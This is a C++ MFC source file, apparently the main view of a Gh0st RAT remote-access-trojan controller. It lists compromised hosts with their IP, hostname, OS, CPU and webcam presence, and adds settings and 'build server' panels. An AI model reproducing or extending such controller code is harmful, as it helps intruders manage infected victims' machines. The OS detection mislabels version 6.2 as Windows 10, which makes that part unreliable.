
// Gh0stView.cpp : CGh0stView 类的实现
//

#include "stdafx.h"
// SHARED_HANDLERS 可以在实现预览、缩略图和搜索筛选器句柄的
// ATL 项目中进行定义，并允许与该项目共享文档代码。
#ifndef SHARED_HANDLERS
#include "Gh0st.h"
#endif


#include "Gh0stView.h"
#include "MainFrm.h"
#include "SetingView.h"
#include "BuildView.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#endif

typedef struct
{
	BYTE              bToken;        //令牌
	OSVERSIONINFOEX   OsVerInfoEx;   //版本信息
	int               CPUClockMhz;   //CPU主频
	IN_ADDR           IPAddress;     //存储32位的IPv4的地址数据结构
	char              HostName[50];  //主机名
	bool              bIsWevCam;     //是否有摄像头
	DWORD             dwSpeed;       //网速
}LOGININFO;
typedef struct  
{
	char *title;
	int nWidth;
}COLUMNSTRUCT;

COLUMNSTRUCT g_Column_Data[] = 
{
	{"ID",48},
	{"WAN",102},
	{"LAN",102},
	{"计算机名/备注",107},
	{"操作系统",128},
	{"CPU",55},
	{"Ping",40},
	{"摄像头",51},
	{"区域",100}
};

int g_Column_Width = 0;
int g_Column_Count = (sizeof(g_Column_Data) / 8);
// CGh0stView

IMPLEMENT_DYNCREATE(CGh0stView, CListView)

BEGIN_MESSAGE_MAP(CGh0stView, CListView)
	ON_MESSAGE(WM_MYINITIALUPDATE, OnMyInitialUpdate)
	ON_MESSAGE(WM_ADDTOLIST, OnAddToList)
END_MESSAGE_MAP()

// CGh0stView 构造/析构


CGh0stView::CGh0stView()
{
	// TODO: 在此处添加构造代码
	((CGh0stApp *)AfxGetApp())->m_pConnectView = this;
}

CGh0stView::~CGh0stView()
{
	
	
}

BOOL CGh0stView::PreCreateWindow(CREATESTRUCT& cs)
{
	// TODO: 在此处通过修改
	//  CREATESTRUCT cs 来修改窗口类或样式
	cs.style |= LVS_REPORT;
	return CListView::PreCreateWindow(cs);
}

void CGh0stView::OnInitialUpdate()
{
	CListView::OnInitialUpdate();
	//修改字体
// 	#ifndef _DEBUG
// 	NONCLIENTMETRICS ncm;
// 	memset(&ncm, 0, sizeof(NONCLIENTMETRICS));
// 	ncm.cbSize = sizeof(NONCLIENTMETRICS);
// 	VERIFY(::SystemParametersInfo(SPI_GETNONCLIENTMETRICS, sizeof(NONCLIENTMETRICS), &ncm, 0));
// 	ncm.lfMessageFont.lfWeight = 500;
// 	m_headerCtrl.m_HeaderFont.CreateFontIndirect(&ncm.lfMessageFont);
// 	SetFont(&(m_headerCtrl.m_HeaderFont));
// 	#endif
	m_pListCtrl = &GetListCtrl();
	m_pListCtrl->SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	// TODO: 调用 GetListCtrl() 直接访问 ListView 的列表控件，
	//  从而可以用项填充 ListView。

		for (int i=0;i < g_Column_Count;i++)
		{
			m_pListCtrl->InsertColumn(i, g_Column_Data[i].title);
			m_pListCtrl->SetColumnWidth(i, g_Column_Data[i].nWidth);
			g_Column_Width += g_Column_Data[i].nWidth;
		}
		PostMessage(WM_MYINITIALUPDATE);
}


// CGh0stView 诊断

#ifdef _DEBUG
void CGh0stView::AssertValid() const
{
	CListView::AssertValid();
}

void CGh0stView::Dump(CDumpContext& dc) const
{
	CListView::Dump(dc);
}

CGh0stDoc* CGh0stView::GetDocument() const // 非调试版本是内联的
{
	ASSERT(m_pDocument->IsKindOf(RUNTIME_CLASS(CGh0stDoc)));
	return (CGh0stDoc*)m_pDocument;
}
#endif //_DEBUG


// CGh0stView 消息处理程序
LRESULT CGh0stView::OnMyInitialUpdate(WPARAM wParam, LPARAM lParam)
{
	CGh0stView* pView = this;
	((CFrameWnd*)AfxGetApp()->m_pMainWnd)->AddView("Comment", this,"connect user");
	SetingView* pSetingView = new SetingView;
	((CWnd*)pSetingView)->Create(NULL, NULL, AFX_WS_DEFAULT_VIEW, CRect(0, 0, 0, 0), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("Setting", pSetingView, "control setting");
	BuildView* pBuildView = new BuildView;
	((CWnd*)pBuildView)->Create(NULL, NULL,WS_CHILD | WS_VISIBLE, CRect(0, 210, 400, 400), AfxGetApp()->GetMainWnd(), AFX_IDW_PANE_FIRST, NULL);
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->AddView("build", pBuildView, "build server");
	((CMainFrame*)AfxGetApp()->m_pMainWnd)->SetCurView(0);
	
	return 0;
}
LRESULT CGh0stView::OnAddToList(WPARAM wParam, LPARAM lParam)
{
	//AfxMessageBox("get");
	ClientContext *pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;

	LOGININFO* LoginInFo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	CString str,strOS;
	str.Format("%d", m_nCount++);
	int nCnt = m_pListCtrl->GetItemCount();

	int i = m_pListCtrl->InsertItem(nCnt, str);

	str.Format("%d", LoginInFo->dwSpeed);
	m_pListCtrl->SetItemText(i, 6, str);

	m_pListCtrl->SetItemText(i, 7, LoginInFo->bIsWevCam ? "有" : "无");
	
// 	str.Format("%d %d", LoginInFo->OsVerInfoEx.dwMajorVersion, LoginInFo->OsVerInfoEx.dwMinorVersion);
// 	AfxMessageBox(str);

	char *pszOS = NULL;
	switch (LoginInFo->OsVerInfoEx.dwPlatformId)
	{
	case VER_PLATFORM_WIN32_NT:
		if (LoginInFo->OsVerInfoEx.dwMajorVersion == 6 && LoginInFo->OsVerInfoEx.dwMinorVersion == 1)
			pszOS = "win7";
		else if(LoginInFo->OsVerInfoEx.dwMajorVersion == 6 && LoginInFo->OsVerInfoEx.dwMinorVersion == 2)
			pszOS = "win10";
		else if (LoginInFo->OsVerInfoEx.dwMajorVersion == 5 && LoginInFo->OsVerInfoEx.dwMinorVersion == 0)
			pszOS = "2000";
		else if (LoginInFo->OsVerInfoEx.dwMajorVersion == 5 && LoginInFo->OsVerInfoEx.dwMinorVersion == 1)
			pszOS = "XP";
		else if (LoginInFo->OsVerInfoEx.dwMajorVersion == 5 && LoginInFo->OsVerInfoEx.dwMinorVersion == 2)
			pszOS = "2003";
		else if (LoginInFo->OsVerInfoEx.dwMajorVersion == 6 && LoginInFo->OsVerInfoEx.dwMinorVersion == 0)
			pszOS = "vista";
		else if (LoginInFo->OsVerInfoEx.dwMajorVersion <=4 )
			pszOS = "NT";
	}
	
	strOS.Format("%s SP%d (Build %d)", pszOS, LoginInFo->OsVerInfoEx.wServicePackMajor, LoginInFo->OsVerInfoEx.dwBuildNumber);
	m_pListCtrl->SetItemText(i, 4, strOS);

	


 	m_pListCtrl->SetItemText(i, 3,LoginInFo->HostName);
	return 0;
}